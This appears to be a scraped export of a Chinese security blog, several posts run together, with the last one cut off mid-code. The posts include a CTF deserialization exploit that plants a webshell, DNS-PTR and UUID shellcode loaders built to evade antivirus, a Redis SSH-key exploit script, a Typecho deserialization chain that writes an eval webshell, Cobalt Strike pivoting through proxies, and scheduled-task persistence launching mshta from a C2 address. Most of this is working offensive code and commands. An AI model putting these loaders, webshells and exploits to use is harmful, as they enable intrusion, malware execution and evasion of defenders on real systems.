12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phphighlight_file(__FILE__);error_reporting(0);include('shell.php');class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username='user'; $this-&gt;password='user'; } public function __wakeup(){ if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){ //admin $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); }}class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } }}class register{ public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ die('success register admin'); }else{ die('please register admin '); } }}class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); //终点 } }}if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b']))){ // @unserialize(base64_decode($_POST['unser']));} 构造exp读取shell.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{ public $file; public $filename; public $content;}class register{}class Open{}$a=new Game();$b=new Open();$a-&gt;register='admin';$a-&gt;file=$b;$a-&gt;filename='shell';$a-&gt;username='admin';$a-&gt;password='admin';echo base64_encode(serialize($a));//$b=new login(); 12345678910111213//shell.php&lt;?phpfunction shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die('so long!'); }}login success you can to open shell file! 可以看到必须删除掉waf.txt才能调用shell方法 123456789class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); } }} 在这个地方花费了很长时间，一开始的思路是利用伪协议来操作文件，但是伪协议不能做到删除文件。后来想到可以利用同名方法，查php内置类的时候发现ZipArchive类有open方法 1234567public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } } 构造删除文件exp 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{ public $file; public $filename; public $content;}class register{}class Open{}$a=new Game();$b=new ZipArchive();$a-&gt;content=ZipArchive::OVERWRITE;$a-&gt;register='admin';$a-&gt;file=$b;$a-&gt;filename='waf.txt';$a-&gt;username='admin';$a-&gt;password='admin';echo base64_encode(serialize($a));//$b=new login(); 删除成功 接下来可以调用shell方法了，限制长度为10位字符，可以采用追加内容的方式写入shell 12345678910111213//shell.php&lt;?phpfunction shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die('so long!'); }}login success you can to open shell file! 为了防止出现&lt;?这种特殊字符，把内容先base64编码后再写入 12//&lt;?php eval($_GET[1]);echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php 把文件内容分割后写入到文件名中，因为写入时间顺序的原因所以需要把命令倒序写入，ls -t表示把文件名按照时间排序，把所有文件名写入到0这个文件中，然后sh 0执行echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php写入文件 1234567891011121314151617181920w&gt;hpw&gt;1.p\\\\w&gt;d\\&gt;\\\\w&gt;\\ -\\\\w&gt;e64\\\\w&gt;bas\\\\w&gt;7\\|\\\\w&gt;XSk\\\\w&gt;Fsx\\\\w&gt;dFV\\\\w&gt;kX0\\\\w&gt;bCg\\\\w&gt;XZh\\\\w&gt;AgZ\\\\w&gt;waH\\\\w&gt;PD9\\\\w&gt;o\\ \\\\w&gt;ech\\\\ls -t&gt;0sh 0 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{ public $file; public $filename; public $content;}class register{}class Open{}$a=new Game();$b=new Open();$a-&gt;register='admin';$a-&gt;content='w&gt;e64\\\\';$a-&gt;file=$b;$a-&gt;filename='shell';$a-&gt;username='admin';$a-&gt;password='admin';echo base64_encode(serialize($a));//$b=new login(); 命令有点长，写了个脚本利用，首先新建二十个php文件，修改content属性为对应的命令，然后生成payload再发起请求 1234567891011import requestsfor i in range(1,21): localurl='http://localhost/ctf/1/%d.php' %i r=requests.get(localurl) payload=r.text #print(payload) data={'unser':payload} r=requests.post(url='http://cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun/?a[]=1&amp;b[]=2',data=data) print(r.status_code) 拿到flag 1http://cf614f52-155c-4be7-b52b-8ab7d0076465.node1.hackingfor.fun/1.php?1=system(%22cat%20/flag%22);","link":"/2021/03/23/nepctf%E9%83%A8%E5%88%86wp/"},{"title":"python利用dns的PTR记录加载shellcode","text":"DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。 PTR记录的两个特性 1.不区分大小写，dns解析结果统一转为小写 2.格式不定，可以出现包括“!@#$%^&amp;*()_+=/?&lt;&gt;”在内的各种特殊字符和空格，只有反斜杠“\\”会被过滤。 在本地服务器添加 进行反向解析查询，192.168.111.135为DNS服务器的ip 1nslookup -qt=ptr 192.168.111.1 192.168.111.135 可以看到成功获取了之前设置好的内容，可以把这一段代码替换成shellcode 用cs生成shellcode，由于shellcode本质是一串十六进制的机器码，因此可以先去掉前面的转义字符\\x并以字符串的形式保存在PTR记录中，执行时再转为十六进制格式，也符合PTR记录中不能出现反斜杠的规则 分割shellcode，每个ip对应的PTR记录保存一行，这里添加的IP为192.168.111.20-192.168.111.59 去掉所有的\\x，把它们分割成多个部分按照顺序添加到PTR记录中 只需要按照顺序对相应的ip发起请求即可获得部分shellcode 利用python的dnspython库获取PTR记录中的shellcode，然后分配内存执行 123456789101112131415161718192021222324252627282930313233343536import dns.resolverimport dns.reversenameimport ctypesdnsip='192.168.111.135'def LoadshellCode(shellcode): #执行shellcode ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode))) handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0))) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))def requestptr(dnsip,ipnum): #获取PTR记录 ipaddr='192.168.111.%d' %ipnum #添加的PTR记录中主机ip地址的C段地址 ip=dns.reversename.from_address(ipaddr) my_resolver = dns.resolver.Resolver() my_resolver.nameservers = [dnsip] answer = my_resolver.resolve(ip,'PTR') recvptr=str(answer[0]).strip('.') return recvptrdef str2hex(shellcodedemo): #将得到的shellcode转为十六进制 s='' s1=b'' for i in range(int(len(shellcodedemo))): if i % 2 == 0: s1 += bytes.fromhex(shellcodedemo[i:i + 2]) return bytearray(s1)if __name__=='__main__': s='' for i in range(20,60): #根据添加的ip范围进行请求，192.168.111.20-192.168.111.59对应range(20,60) s+=requestptr(dnsip,i) LoadshellCode(str2hex(s)) 使用pyinstaller打包成exe文件， 1pyinstaller -F -w dnsptrshellcode.py pyinstaller默认一并打包所有库，造成生成的exe文件体积过大，可以利用虚拟环境打包的方式压缩下体积，压缩后的体积大概为3M左右 https://blog.csdn.net/p1967914901/article/details/109706449 拿到beacon 可以绕过360，但被火绒查杀 github地址：https://github.com/sp4zcmd/DnsPTRShellcodeLoader 参考： https://www.freebuf.com/articles/network/185324.html","link":"/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/"},{"title":"python编写Redis漏洞检测和利用脚本","text":"python编写Redis漏洞检测和利用脚本环境配置1234# wget http://download.redis.io/releases/redis-6.0.8.tar.gz# tar xzf redis-6.0.8.tar.gz# cd redis-6.0.8# make 执行完 make 命令后，redis-6.0.8 的 src 目录下会出现编译后的 redis 服务程序 redis-server，还有用于测试的客户端程序 redis-cli： 下面启动 redis 服务： 12# cd src# ./redis-server 修改redis.conf，先注释掉bind 127.0.0.1这一行，允许远程登陆，同时关闭保护模式 使用修改后的配置文件启动 12# cd src# ./redis-server ../redis.conf 利用过程修改数据库默认路径为/root/.ssh，默认缓存文件为authorized.keys，把目标主机缓存的公钥作为value保存在authorized.keys文件中，这样就在服务器端/root/.ssh下生成了一个授权的key 1.本地主机生成密钥key 1ssh-keygen -t rsa 2.在目录/root/.ssh下查看生成结果，并把公钥导入txt文件中 1234cd /root/.sshls(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; key.txtcat key.txt 3.把生成的公钥导入Redis缓存中 1cat /root/key.txt | redis-cli -h xx.xx.xx.xx 4.连接到目标主机，更改配置文件路径为/root/.ssh，设置文件名称为authorized-keys 12345redis-cli -h xx.xx.xx.xxconfig set dir /root/.sshConfig set dbfilename authorized_keyssave 5.ssh连接到目标主机 1ssh xx.xx.xx.xx 编写python脚本github地址：https://github.com/sp4zcmd/SimpleRedisScanner 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import socketimport redisimport sysdef Usage(): print('RedisScanner.py 127.0.0.1 key.txt')def Scan(ip): payload=&quot;\\x2a\\x31\\x0d\\x0a\\x24\\x34\\x0d\\x0a\\x69\\x6e\\x66\\x6f\\x0d\\x0a&quot; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(10) try: s.connect((ip, 6379)) s.sendall(payload.encode()) recvdata=s.recv(1024).decode() if 'redis_version' in recvdata: print('[+] %s is vulnerable ' %ip) #print(recvdata) return True except: print('[-] %s is not vulnerable ' %ip) return False passdef WriteSSHKeygen(ip,sshkey): try: r = redis.StrictRedis(host=ip, port=6379, db=0, socket_timeout=2) r.flushall() r.set('crackit', sshkey) r.config_set('dir', '/root/.ssh/') r.config_set('dbfilename', 'authorized_keys') r.save() print('[+] Write SSHkeygen successful') except: print('[-] Write SSHkeygen Failed') passif __name__=='__main__': if(len(sys.argv)==3): ip=sys.argv[1] sshkeyfile=sys.argv[2] try: with open(sshkeyfile, 'r') as f: sshkey = f.read() except: print('Read SSHkeygen Failed') pass if Scan(ip): WriteSSHKeygen(ip, sshkey) else: Usage() 运行测试 写入成功 成功连接","link":"/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/"},{"title":"typecho反序列化分析","text":"分析1.install.php install.php中存在unserialize函数，__typecho_config可控。值被作为参数传入类Typecho_Db 2./var/Typecho/Cookie.php Typecho_Cookie::get方法从Cookie或者是POST数组中获取数据 3./var/Typecho/Db.php 跟进类Typecho_Db,传入的参数被作为字符串拼接，触发__toString()，全局搜索toString 4./var/Typecho/Feed.php中存在可利用toString方法 满足条件self::RSS2 == $this-&gt;_type执行下面的语句，如果$item[‘author’]是一个类，就会触发__get()方法，开始全局搜索get方法 1$content .= '&lt;dc:creator&gt;' . htmlspecialchars($item['author']-&gt;screenName) . '&lt;/dc:creator&gt;' . self::EOL; 5./var/Typecho/request.php request.php中Typecho_Request类存在__get()方法，__get()含有一个参数，即要获取的成员属性的名称，$key=’screenName’ 6.跟进get方法 6.跟进_applyFilter方法，发现call_user_func函数，到达终点。filter属性为要执行的函数，$value来源为传入参数，在get函数中被$value = $this-&gt;_params[$key]赋值，来源于属性_params。$this-&gt;_params[$key]等于$this-&gt;_params['screenName'] 构造利用链令Typecho_Db类中的$adapterName=$config[‘adapter’]等于Feed.php中的Typecho_Feed类，创建一个数组$a=array(‘adapter’ =&gt;new Typecho_Feed(),’prefix’ =&gt; ‘typecho_’) 令Typecho_Feed类中的$item[‘author’]等于Typecho_Request类 令Typecho_Request类中的属性_params=array('screenName'=&gt;'file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\\$_POST[\\'a\\']); ?&gt;&quot;)') 令Typecho_Request类中的属性_filter=array(‘assert’) 12345678910111213141516171819202122232425262728293031&lt;?phpclass Typecho_Request{ private $_filter = array(); private $_params = array(); public function __construct(){ $this-&gt;_filter[0] = 'assert'; $this-&gt;_params['screenName'] = 'file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\\$_POST[\\'a\\']); ?&gt;&quot;)'; }}class Typecho_Feed{ const RSS2 = 'RSS 2.0'; private $_type; private $_items = array(); public function __construct() { $this-&gt;_type=self::RSS2; $this-&gt;_items[0]=array('author'=&gt;new Typecho_Request()); }}$a=array('adapter' =&gt;new Typecho_Feed(),'prefix' =&gt; 'typecho_');echo urlencode(base64_encode(serialize($a))); 利用条件install.php中要求触发反序列化需要满足两个条件 必须有GET参数finish Refer必须为本站链接，如http://127.0.0.1/typecho 利用结果 写入成功","link":"/2021/03/03/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"title":"uuid免杀","text":"原理分析UUID通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象 将shellcode转换为uuid用msf生成shellcode 1msfvenom -p windows/x64/exec CMD=&quot;calc.exe&quot; -f c 16个字节转换为一个uuid值，不满时用\\x00填充，\\x00占一个字节 首先用python把shellcode转换为uuid 1uuid.UUID(bytes_le=u) uuid转换为字节 1uuid.UUID('1f748bef-481c-fe01-8b34-ae4801f799ff').bytes_le 将shellcode转换为uuid，不足十六个字节的用\\x00补全 12345678910111213import uuidshellcode=b'\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00'shellcodelist=[]if(len(shellcode)%16!=0): while len(shellcode)%16!=0: shellcode+=b'\\x00'for i in range(len(shellcode)//16): u=str(uuid.UUID(bytes_le=shellcode[i*16:i*16+16])) shellcodelist.append(u)print(shellcodelist) 加载shellcode 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;Windows.h&gt;#include &lt;Rpc.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;Rpcrt4.lib&quot;)const char* uuids[] ={&quot;e48348fc-e8f0-00c0-0000-415141505251&quot;,&quot;d2314856-4865-528b-6048-8b5218488b52&quot;,&quot;728b4820-4850-b70f-4a4a-4d31c94831c0&quot;,&quot;7c613cac-2c02-4120-c1c9-0d4101c1e2ed&quot;,&quot;48514152-528b-8b20-423c-4801d08b8088&quot;,&quot;48000000-c085-6774-4801-d0508b481844&quot;,&quot;4920408b-d001-56e3-48ff-c9418b348848&quot;,&quot;314dd601-48c9-c031-ac41-c1c90d4101c1&quot;,&quot;f175e038-034c-244c-0845-39d175d85844&quot;,&quot;4924408b-d001-4166-8b0c-48448b401c49&quot;,&quot;8b41d001-8804-0148-d041-5841585e595a&quot;,&quot;59415841-5a41-8348-ec20-4152ffe05841&quot;,&quot;8b485a59-e912-ff57-ffff-5d48ba010000&quot;,&quot;00000000-4800-8d8d-0101-000041ba318b&quot;,&quot;d5ff876f-f0bb-a2b5-5641-baa695bd9dff&quot;,&quot;c48348d5-3c28-7c06-0a80-fbe07505bb47&quot;,&quot;6a6f7213-5900-8941-daff-d563616c632e&quot;,&quot;00657865-0000-0000-0000-000000000000&quot;,};int main(){ HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); void* ha = HeapAlloc(hc, 0, 0x100000); //ha为指向申请堆的首地址的指针 DWORD_PTR hptr = (DWORD_PTR)ha; //让hptr指向ha int elems = sizeof(uuids) / sizeof(uuids[0]); for (int i = 0; i &lt; elems; i++) { RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);//转换后指向uuid地址保存在hptr if (status != RPC_S_OK) { printf(&quot;failed&quot;); CloseHandle(ha); return -1; } hptr += 16; } EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0); //把EnumSystemLocalesA参数中的回调函数设置为指向shellcode地址指针，执行shellcode CloseHandle(ha); return 0;} 执行成功 API函数UuidFromStringA将字符串形式的shellcode转换为UUID，成功返回RPC_S_OK，失败返回RPC_S_INVALID_STRING_UUID 1234RPC_STATUS UuidFromStringA( RPC_CSTR StringUuid, //指向字符串的指针 UUID *Uuid //以二进制形式返回指向UUID的指针。 ); EnumSystemLocalesA功能为枚举操作系统上安装或支持的语言环境，第一个参数为指向应用程序定义的回调函数的指针，将它设置为指向UUID的指针即可执行shellcode 1234BOOL EnumSystemLocalesA( LOCALE_ENUMPROCA lpLocaleEnumProc, ///指向应用程序定义的回调函数的指针 DWORD dwFlags //指定要枚举的语言环境标识符的标志);","link":"/2021/02/27/uuid%E5%85%8D%E6%9D%80/"},{"title":"不出网主机上线方法","text":"测试环境假设192.168.111.0/24为公网ip段，192.168.204.0/24为内网ip段 web服务器 Windows 2008 r2DMZ主机 虚拟机两块网卡一块设置为NAT模式，一块设置为HOSTONLY模式，可通外网 公网ip:192.168.111.132 内网ip:192.168.204.188 内网主机 Windows 2012虚拟机网卡设置HOSTONLY模式，不通外网 内网ip:192.168.204.141 C2： Kali Linux公网ip：192.168.111.129 1.SMB beacon​ SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。 ​ 首先得到内网中一台主机的beacon，抓取密码后进行smb喷射，得到另一台开放445端口的机器上的administrator账户密码，在目标机器不出网的情况下，可以使用Smb beacon使目标主机上线 使用条件 1.具有 SMB Beacon 的主机必须接受 445 端口上的连接。 2.只能链接由同一个 Cobalt Strike 实例管理的 Beacon。 3.利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。 使用方法web服务器上线cs，run mimikatz抓取密码 建立listener，选择SMB beacon 在cs中使用psexec进行横向移动，选择现有的beacon作为跳板，这里凭据必须是administrator ，即拥有目标主机管理员权限 连接成功，可以看到smb beacon上线的主机右侧有∞∞标识 2.配置listener通过HTTP代理上线使用goproxy搭建代理goproxy 上传proxy.exe到web服务器，在8080端口开启http代理 1shell C:\\proxy.exe http -t tcp -p &quot;0.0.0.0:8080&quot; --daemon 用netsh命令把外网ip的8080端口转发到内网ip的192.168.204.188的822端口(必须为未使用的端口，否则会失败),web服务器的80端口被占用，不能使用 1shell netsh interface portproxy add v4tov4 listenaddress=192.168.204.188 listenport=822 connectaddress=192.168.111.132 connectport=8080 检测端口是否启用 1netstat -ano | findstr :822 创建listener设置如下 生成stageless payload关于stage 和 stageless的区别： 探寻Metasploit Payload模式背后的秘密 stager分阶段，第一阶段申请内存，第二件阶段向C2发起请求并接受shellcode执行 stageless不分阶段，生成时就包含了所有文件，可以避免shellcode传输不畅造成目标无法上线 成功上线 连接过程 192.168.204.141 → 192.168.204.188:822→ 192.168.111.132:8080→ C2 3.使用pystinger搭建socks4代理pystinger 原理来源:红队攻防实践：不出网主机搭建内网隧道新思路 服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量 使用方法上传proxy.php到网站目录，正常访问返回UTF-8 上传stinger_server.exe，执行 1start stinger_server.exe 0.0.0.0 Kali上执行 1./stinger_client -w http://192.168.111.132:81/proxy.php -l 127.0.0.1 -p 60000 cs中新建listener，192.168.204.188为web服务器内网ip，60020为转发端口 使用psexec横向移动，选择listener为stinger，成功上线 参考：Cobalt Strike Listener with Proxy 红队攻防实践：不出网主机搭建内网隧道新思路 dns与smb beacon详解与一种内网穿透方法的实践 内网渗透：不出网渗透技巧https://www.freebuf.com/articles/web/247287.html)","link":"/2020/12/15/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95/"},{"title":"使用COM组件创建计划任务","text":"Windows系统可以设置计划任务来指向一些定时任务。本书中计划任务的触发条件是在用户登陆时触发，执行启动指定路径程序的操作 创建计划任务时涉及到COM组件接口的调用，要求管理员权限，程序逻辑概括为三个部分，分别是初始化操作、创建计划任务操作、删除计划任务操作。 1.初始化操作由于使用COM组件，所以必须调用CoInitialize函数来初始化COM接口环境，这样才能使用COM接口函数。同时也要先获取ITaskService对象指针以及ITaskFolder指针，这两个指针对象主要用来进行计划任务的创建操作。 1.CoInitialize初始化COM组件 2.CoCreateInstance创建任务服务对象 3.连接到任务服务 4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务 初始化操作完成后直接操作ITaskService对象以及ITaskFolder对象 2.创建计划任务从ITaskService对象中创建一个任务定义对象ITaskDefinition，它被用于创建任务，然后对任务定义对象ITaskDefinition进行设置 设置注册信息，包括设置作者信息。 设置主体信息，包括登陆类型、运行权限。 设置配置信息，包括使用电池运行时是否停止 设置操作信息，包括要启动的程序，并设置程序路径和参数 设置触发器，在用户登陆时执行计划任务 3.删除计划任务调用DeleteTask接口函数删除指定名称的计划任务 完整代码这里使用mshta上线，无文件上线的方法很多，不局限这一种 将计划任务设置为执行c:\\windows\\system32\\mshta.exe http://192.168.111.129:8080/p7ptgsev.hta 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208#include &lt;atlbase.h&gt;#include &lt;comdef.h&gt;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;shlobj_core.h&gt;#include &lt;taskschd.h&gt;#pragma comment(lib, &quot;taskschd.lib&quot;)ITaskService* m_lpITS = NULL;ITaskFolder* m_lpRootFolder = NULL;//初始化COM组件void Init() { //1.CoInitialize初始化COM组件 HRESULT hr = CoInitialize(NULL); if (FAILED(hr)) { MessageBox(NULL, L&quot;初始化COM组件失败&quot;, L&quot;Failed&quot;, MB_OK); } //2.CoCreateInstance创建任务服务对象 hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&amp;m_lpITS); if (FAILED(hr)) { MessageBox(NULL, L&quot;创建任务服务失败&quot;, L&quot;Failed&quot;, MB_OK); } //3.连接到任务服务 hr = m_lpITS-&gt;Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()); if (FAILED(hr)) { MessageBox(NULL, L&quot;连接服务失败&quot;, L&quot;Failed&quot;, MB_OK); } //4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务 hr = m_lpITS-&gt;GetFolder(_bstr_t(&quot;\\\\&quot;), &amp;m_lpRootFolder); if (FAILED(hr)) { MessageBox(NULL, L&quot;获取指针失败&quot;, L&quot;Failed&quot;, MB_OK); }}//卸载COM组件void UnInit() { if (m_lpITS) { m_lpITS-&gt;Release(); } if (m_lpRootFolder) { m_lpRootFolder-&gt;Release(); } ::CoUninitialize();}//创建计划任务BOOL CreateTask(const char* lpszTaskName,const char* lpszProgramPath,const char* lpszParameters,const char* lpszAuthor) { // 创建任务定义对象来创建任务 ITaskDefinition* pTaskDefinition = NULL; HRESULT hr = m_lpITS-&gt;NewTask(0, &amp;pTaskDefinition); if (FAILED(hr)) { return FALSE; } /* 设置注册信息 */ IRegistrationInfo* pRegInfo = NULL; CComVariant variantAuthor(NULL); variantAuthor = lpszAuthor; hr = pTaskDefinition-&gt;get_RegistrationInfo(&amp;pRegInfo); if (FAILED(hr)) { return FALSE; } // 设置作者信息 hr = pRegInfo-&gt;put_Author(variantAuthor.bstrVal); pRegInfo-&gt;Release(); /* 设置登录类型和运行权限 */ IPrincipal* pPrincipal = NULL; hr = pTaskDefinition-&gt;get_Principal(&amp;pPrincipal); if (FAILED(hr)) { return FALSE; } // 设置登录类型 hr = pPrincipal-&gt;put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN); // 设置运行权限 // 最高权限 hr = pPrincipal-&gt;put_RunLevel(TASK_RUNLEVEL_HIGHEST); pPrincipal-&gt;Release(); /* 设置其他信息 */ ITaskSettings* pSettting = NULL; hr = pTaskDefinition-&gt;get_Settings(&amp;pSettting); if (FAILED(hr)) { return FALSE; } // 设置其他信息 hr = pSettting-&gt;put_StopIfGoingOnBatteries(VARIANT_FALSE); hr = pSettting-&gt;put_DisallowStartIfOnBatteries(VARIANT_FALSE); hr = pSettting-&gt;put_AllowDemandStart(VARIANT_TRUE); hr = pSettting-&gt;put_StartWhenAvailable(VARIANT_FALSE); hr = pSettting-&gt;put_MultipleInstances(TASK_INSTANCES_PARALLEL); pSettting-&gt;Release(); /* 创建执行动作 */ IActionCollection* pActionCollect = NULL; hr = pTaskDefinition-&gt;get_Actions(&amp;pActionCollect); if (FAILED(hr)) { return FALSE; } IAction* pAction = NULL; // 创建执行操作 hr = pActionCollect-&gt;Create(TASK_ACTION_EXEC, &amp;pAction); pActionCollect-&gt;Release(); /* 设置执行程序路径和参数 */ CComVariant variantProgramPath(NULL); CComVariant variantParameters(NULL); IExecAction* pExecAction = NULL; hr = pAction-&gt;QueryInterface(IID_IExecAction, (PVOID*)(&amp;pExecAction)); if (FAILED(hr)) { pAction-&gt;Release(); return FALSE; } pAction-&gt;Release(); // 设置程序路径和参数 variantProgramPath = lpszProgramPath; variantParameters = lpszParameters; pExecAction-&gt;put_Path(variantProgramPath.bstrVal); pExecAction-&gt;put_Arguments(variantParameters.bstrVal); pExecAction-&gt;Release(); /* 创建触发器，实现用户登陆自启动 */ ITriggerCollection* pTriggers = NULL; hr = pTaskDefinition-&gt;get_Triggers(&amp;pTriggers); if (FAILED(hr)) { return FALSE; } // 创建触发器,把触发器设置为 ITrigger* pTrigger = NULL; hr = pTriggers-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger); if (FAILED(hr)) { return FALSE; } /* 注册任务计划 */ IRegisteredTask* pRegisteredTask = NULL; CComVariant variantTaskName(NULL); variantTaskName = lpszTaskName; hr = m_lpRootFolder-&gt;RegisterTaskDefinition(variantTaskName.bstrVal, pTaskDefinition, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), 